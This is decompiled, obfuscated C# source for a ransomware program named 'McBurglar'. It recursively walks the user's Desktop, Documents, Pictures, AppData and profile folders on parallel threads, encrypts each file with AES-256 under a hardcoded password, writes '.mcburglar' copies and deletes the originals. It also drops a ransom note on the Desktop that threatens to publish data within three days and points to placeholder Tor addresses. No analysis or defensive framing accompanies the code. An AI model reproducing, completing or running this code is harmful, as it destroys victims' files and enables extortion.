using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace ns0;

internal sealed class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal void method_0()
		{
			smethod_2(string_0);
		}
	}

	private static List<string> list_0 = new List<string>();

	private static string string_0 = "abc";

	private static void Main(string[] args)
	{
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.NetworkShortcuts));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		list_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
		smethod_0();
		smethod_1();
	}

	private static void smethod_0()
	{
		foreach (string string_0 in list_0)
		{
			new Thread((ThreadStart)delegate
			{
				smethod_2(string_0);
			}).Start();
		}
	}

	private static void smethod_1()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "README-MCBURGLAR.txt");
		string value = "  ___                       ___  \n (o o)                     (o o) \n(  V  ) !!! ATTENTION !!! (  V  )\n--m-m-----------------------m-m--\n ▄· ▄▌      ▄• ▄▌   ▄ .▄ ▄▄▄·  ▌ ▐·▄▄▄ .  ▄▄▄▄· ▄▄▄ .▄▄▄ . ▐ ▄   ▄▄▄▄· ▄▄▄  ▄▄▄ . ▄▄▄·  ▄▄·  ▄ .▄▄▄▄ .·▄▄▄▄  \n▐█▪██▌ ▄█▀▄ █▪██▌  ██▪▐█▐█ ▀█ ▪█·█▌▀▄.▀·  ▐█ ▀█▪▀▄.▀·▀▄.▀·•█▌▐█  ▐█ ▀█▪▀▄ █·▀▄.▀·▐█ ▀█ ▐█ ▌▪██▪▐█▀▄.▀·██· ██ \n▐█▌▐█▪▐█▌.▐▌█▌▐█▌  ██▀▀█▄█▀▀█ ▐█▐█•▐▀▀▪▄  ▐█▀▀█▄▐▀▀▪▄▐▀▀▪▄▐█▐▐▌  ▐█▀▀█▄▐▀▀▄ ▐▀▀▪▄▄█▀▀█ ██ ▄▄██▀▀█▐▀▀▪▄▐█▪ ▐█▌\n ▐█▀·.▐█▌.▐▌▐█▄█▌  ██▌▐▀▐█▪ ▐▌ ███ ▐█▄▄▌  ██▄▪▐█▐█▄▄▌▐█▄▄▌██▐█▌  ██▄▪▐█▐█•█▌▐█▄▄▌▐█▪ ▐▌▐███▌██▌▐▀▐█▄▄▌██. ██ \n  ▀ •  ▀█▄▀▪ ▀▀▀   ▀▀▀ · ▀  ▀ . ▀   ▀▀▀   ·▀▀▀▀  ▀▀▀  ▀▀▀ ▀▀ █▪  ·▀▀▀▀ .▀  ▀ ▀▀▀  ▀  ▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ▀▀▀▀▀• \n    ▄▄▄·▄▄▄   ▄▄▄·  ▌ ▐·       ▐ ▄  ▄▄▄· \nby ▐█ ▄█▀▄ █·▐█ ▀█ ▪█·█▌ ▄█▀▄ •█▌▐█▐█ ▀█ \n    ██▀·▐▀▀▄ ▄█▀▀█ ▐█▐█•▐█▌.▐▌▐█▐▐▌▄█▀▀█  \n    ▐█▪·•▐█•█▌▐█▪ ▐▌ ███ ▐█▌.▐▌██▐█▌▐█▪ ▐▌ \n    .▀   .▀  ▀ ▀  ▀ . ▀   ▀█▄▀▪▀▀ █▪ ▀  ▀  \n\n✩░▒▓▆▅▃▂▁\ud835\udc30\ud835\udc21\ud835\udc1a\ud835\udc2d \ud835\udc21\ud835\udc1a\ud835\udc29\ud835\udc29\ud835\udc1e\ud835\udc27\ud835\udc1e\ud835\udc1d ?▁▂▃▅▆▓▒░✩\n\nYOUR NETWORK HAS BEEN INFILTRATED, AND WE HAVE ACCESSED ALL YOUR DATA\n✩░▒▓▆▅▃▂▁\ud835\udc30\ud835\udc21\ud835\udc1a\ud835\udc2d \ud835\udc1d\ud835\udc28\ud835\udc1e\ud835\udc2c \ud835\udc2d\ud835\udc21\ud835\udc22\ud835\udc2c \ud835\udc26\ud835\udc1e\ud835\udc1a\ud835\udc27?▁▂▃▅▆▓▒░✩\n\nIT MEANS THAT SOON YOUR PARTNERS, CLIENTS, BOARD AND MASS MEDIA WILL KNOW OF YOUR PROBLEM\n✩░▒▓▆▅▃▂▁\ud835\udc21\ud835\udc28\ud835\udc30 \ud835\udc1c\ud835\udc1a\ud835\udc27 \ud835\udc22\ud835\udc2d \ud835\udc1b\ud835\udc1e \ud835\udc1a\ud835\udc2f\ud835\udc28\ud835\udc22\ud835\udc1d\ud835\udc1e\ud835\udc1d ?▁▂▃▅▆▓▒░✩\n\nIN ORDER TO AVOID ISSUE\nYOU ARE TO CONTACT US NO LATER THAN 3 DAYS AND CONCLUDE DATA RECOVERY AND AGREEMENT✩░▒▓▆▅▃▂▁\ud835\udc30\ud835\udc21\ud835\udc1a\ud835\udc2d \ud835\udc22\ud835\udc1f \ud835\udc22 \ud835\udc1d\ud835\udc28 \ud835\udc27\ud835\udc28\ud835\udc2d \ud835\udc1c\ud835\udc28\ud835\udc27\ud835\udc2d\ud835\udc1a\ud835\udc1c\ud835\udc2d \ud835\udc32\ud835\udc28\ud835\udc2e?▁▂▃▅▆▓▒░✩\n\nIF YOU DO NOT CONTACT US IN THE NEXT 3 DAYS WE WILL BEGIN DATA PUBLICATION\n✩░▒▓▆▅▃▂▁\ud835\udc21\ud835\udc28\ud835\udc30 \ud835\udc1d\ud835\udc28 \ud835\udc22 \ud835\udc1c\ud835\udc28\ud835\udc27\ud835\udc2d\ud835\udc1a\ud835\udc1c\ud835\udc2d \ud835\udc32\ud835\udc28\ud835\udc2e ?▁▂▃▅▆▓▒░✩\n\nWIZE CHOICE, THERE IS FEW WAY TO DO THIS\n\nI. RECOMMENDED (MOST SECURE METHOD)\n\na) DOWNLOAD TOR BROWSER (https://www.torproject.org/download/)\nb) INSTALL THE TOR BROWSER\nc) OPEN OUR WEBSITE WITH LIVE CHAT IN THE TOR BROWSER (http://XXXXXXXXXXXXXXXXXXXX.onion)\nd) FOLLOW THE INSTRUCTIONS ON THIS PAGE\n\nII. IF THIS METHOD IS NOT SUITABLE FOR YOU OR TOR IS BLOCKED IN YOUR COUNTRY\n\na) OPEN OUR WEBPAGE WITH LIVE CHAT (https://XXXXXXXXXXXXXXXXXX.onion)\nb) FOLLOW INSTRUCTION ON PAGE\n\n";
		using StreamWriter streamWriter = new StreamWriter(path);
		streamWriter.WriteLine(value);
	}

	private static void smethod_2(string string_1)
	{
		try
		{
			string[] files = Directory.GetFiles(string_1);
			string[] array = files;
			foreach (string string_2 in array)
			{
				smethod_5(string_2);
			}
			string[] directories = Directory.GetDirectories(string_1);
			string[] array2 = directories;
			foreach (string string_3 in array2)
			{
				smethod_2(string_3);
			}
		}
		catch
		{
		}
	}

	[DllImport("KERNEL32.DLL")]
	public static extern bool RtlZeroMemory(IntPtr intptr_0, int int_0);

	public static byte[] smethod_3()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private static void smethod_4(string string_1, string string_2)
	{
		byte[] array = smethod_3();
		FileStream fileStream = new FileStream(string_1 + ".mcburglar", FileMode.Create);
		new RNGCryptoServiceProvider();
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_1, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	private static void smethod_5(string string_1)
	{
		if (!string_1.Contains(".mcburglar") && !string_1.Contains("README-MCBURGLAR.txt"))
		{
			try
			{
				smethod_4(string_1, string_0);
				File.Delete(string_1);
			}
			catch
			{
			}
		}
	}
}
